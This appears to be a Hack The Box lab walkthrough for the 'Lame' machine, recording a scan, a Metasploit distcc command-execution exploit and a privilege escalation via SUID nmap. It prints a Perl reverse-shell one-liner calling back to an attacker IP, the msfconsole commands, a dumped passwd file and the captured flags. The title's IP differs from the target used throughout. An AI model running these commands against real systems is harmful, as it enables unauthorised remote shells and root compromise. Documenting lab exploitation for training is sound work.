# Lame : 10.10.10.4


Hack the box

## In brief
- 3632/tcp open  distccd 
  - Dist CC  4.2.4 :  CVE 2004-2687 
  - msf exploit/unix/misc/distcc_exec 
  - rewrite exploit_distcc.rb 
- Prov Escalation with sbit on nmap --interactive and  !sh
  
$ msfconsole
msf5 > search distccd

$ msfconsole -x "use exploit/unix/misc/distcc_exec; set payload cmd/unix/reverse_perl;set RHOST 10.10.10.3;set LHOST 10.10.14.4;exploit"



# Rewrite Exploit 
ruby exploit_distcc.rb 


$ find / -user root -perm -4000 -print 2>/dev/null
$ /usr/bin/nmap --interactive
  nmap> !sh



## [nmap -A 10.10.10.3]
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 08:47 CET
Nmap scan report for 10.10.10.3
Host is up (0.075s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))


Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.27 - 2.6.28 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -2d22h05m54s, deviation: 0s, median: -2d22h05m54s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2019-02-11T23:42:07-05:00
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   88.83 ms 10.10.14.1
2   87.61 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.31 seconds



## [21/tcp  open  ftp         vsftpd 2.3.4]
Some version of vsftpd 2.3.4 have a backdoor.
User name with a :) open a back door on port 6200
=> Exploit Not working. Nmap 2000-8000  : no new opened port

anonymous:bob@bob.com => empty dir

## [22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)]


## [139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)]
##[445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)]


## [3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))]
Distributed Compiler Daemon

````
# msfconsole
msf5 > search distccd

Matching Modules
================
   Name                           Disclosure Date  Rank       Check  Description
   ----                           ---------------  ----       -----  -----------
   exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution

msf5 > use exploit/unix/misc/distcc_exec 
msf5 exploit(unix/misc/distcc_exec) > set payload cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
msf5 exploit(unix/misc/distcc_exec) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf5 exploit(unix/misc/distcc_exec) > set LHOST 10.10.14.4
LHOST => 10.10.14.4
msf5 exploit(unix/misc/distcc_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Command shell session 1 opened (10.10.14.4:4444 -> 10.10.10.3:32856) at 2019-02-15 10:07:51 +0100

pwd
/tmp
id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
makis:x:1003:1003::/home/makis:/bin/sh



Ls -al
total 28
drwxrwxrwt  6 root     root    4096 Feb 12 01:06 .
drwxr-xr-x 21 root     root    4096 May 20  2012 ..
drwxrwxrwt  2 root     root    4096 Feb 10 13:45 .ICE-unix
-r--r--r--  1 root     root      11 Feb 10 13:46 .X0-lock
drwxrwxrwt  2 root     root    4096 Feb 10 13:46 .X11-unix
-rw-------  1 tomcat55 nogroup    0 Feb 10 13:47 5146.jsvc_up
-rw-------  1 daemon   daemon     0 Feb 12 00:56 distcc_28fe600f.stderr
drwx------  2 makis    makis   4096 Feb 11 06:25 gconfd-makis
drwx------  2 makis    makis   4096 Feb 11 06:25 orbit-makis


ls -al /home
total 24
drwxr-xr-x  6 root    root    4096 Mar 14  2017 .
drwxr-xr-x 21 root    root    4096 May 20  2012 ..
drwxr-xr-x  2 root    nogroup 4096 Mar 17  2010 ftp
drwxr-xr-x  4 makis   makis   4096 Feb 11 06:25 makis
drwxr-xr-x  2 service service 4096 Apr 16  2010 service
drwxr-xr-x  3    1001    1001 4096 May  7  2010 user

ls -al /home/*
/home/ftp:
total 8
drwxr-xr-x 2 root nogroup 4096 Mar 17  2010 .
drwxr-xr-x 6 root root    4096 Mar 14  2017 ..

/home/makis:
total 36
drwxr-xr-x 4 makis makis 4096 Feb 11 06:25 .
drwxr-xr-x 6 root  root  4096 Mar 14  2017 ..
-rw------- 1 makis makis 1107 Mar 14  2017 .bash_history
-rw-r--r-- 1 makis makis  220 Mar 14  2017 .bash_logout
-rw-r--r-- 1 makis makis 2928 Mar 14  2017 .bashrc
drwx------ 2 makis makis 4096 Feb 11 06:25 .gconf
drwx------ 2 makis makis 4096 Feb 11 06:25 .gconfd
-rw-r--r-- 1 makis makis  586 Mar 14  2017 .profile
-rw-r--r-- 1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
-rw-r--r-- 1 makis makis   33 Mar 14  2017 user.txt

/home/service:
total 20
drwxr-xr-x 2 service service 4096 Apr 16  2010 .
drwxr-xr-x 6 root    root    4096 Mar 14  2017 ..
-rw-r--r-- 1 service service  220 Apr 16  2010 .bash_logout
-rw-r--r-- 1 service service 2928 Apr 16  2010 .bashrc
-rw-r--r-- 1 service service  586 Apr 16  2010 .profile

/home/user:
total 28
drwxr-xr-x 3 1001 1001 4096 May  7  2010 .
drwxr-xr-x 6 root root 4096 Mar 14  2017 ..
-rw------- 1 1001 1001  165 May  7  2010 .bash_history
-rw-r--r-- 1 1001 1001  220 Mar 31  2010 .bash_logout
-rw-r--r-- 1 1001 1001 2928 Mar 31  2010 .bashrc
-rw-r--r-- 1 1001 1001  586 Mar 31  2010 .profile
drwx------ 2 1001 1001 4096 May  7  2010 .ssh

cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5
````

# Rewrite the exploit with msf in one line

$ msfconsole -x "use exploit/unix/misc/distcc_exec; set payload cmd/unix/reverse_perl;set RHOST 10.10.10.3;set LHOST 10.10.14.4;exploit"


# Rewrite the exploit in ruby : exploit_distcc.rb 

Take a wireshark trace
````
Wireshard TCP stream dump
DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV000000e5perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.4:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'ARGV00000001#ARGV00000002-cARGV00000006main.cARGV00000002-oARGV00000006main.oDOTI0000000AWEKvoYoCCu
DONE00000001STAT00000000SERR00000000SOUT00000000DOTO00000000
````

=> ruby exploit_distcc.rb 
Exploit manually written in ruby :)


## Privilege escalation using nmap with sticky bit
````
find / -user root -perm -4000 -print 2>/dev/null
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/ping6
/sbin/mount.nfs
/lib/dhcp3-client/call-dhclient-script
/usr/bin/sudoedit
/usr/bin/X
/usr/bin/netkit-rsh
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/bin/netkit-rlogin
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
/usr/bin/mtr
/usr/sbin/pppd
/usr/lib/telnetlogin
/usr/lib/apache2/suexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown


$ ls -al /usr/bin/nmap
-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap


$ /usr/bin/nmap --interactive

Starting Nmap V. 4.53 ( http://insecure.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
whoami
root
pwd
/tmp

cd /root

ls -al
total 80
drwxr-xr-x 13 root root 4096 Feb 10 13:46 .
drwxr-xr-x 21 root root 4096 May 20  2012 ..
-rw-------  1 root root  373 Feb 10 13:46 .Xauthority
lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -> /dev/null
-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
drwx------  3 root root 4096 May 20  2012 .config
drwx------  2 root root 4096 May 20  2012 .filezilla
drwxr-xr-x  5 root root 4096 Feb 10 13:46 .fluxbox
drwx------  2 root root 4096 May 20  2012 .gconf
drwx------  2 root root 4096 May 20  2012 .gconfd
drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
drwx------  4 root root 4096 May 20  2012 .mozilla
-rw-r--r--  1 root root  141 Oct 20  2007 .profile
drwx------  5 root root 4096 May 20  2012 .purple
-rwx------  1 root root    4 May 20  2012 .rhosts
drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
drwx------  2 root root 4096 Feb 10 13:46 .vnc
drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
-rwx------  1 root root  401 May 20  2012 reset_logs.sh
-rw-------  1 root root   33 Mar 14  2017 root.txt
-rw-r--r--  1 root root  118 Feb 10 13:46 vnc.log



cat root.txt
92caac3be140ef409e45721348a4e9df

````
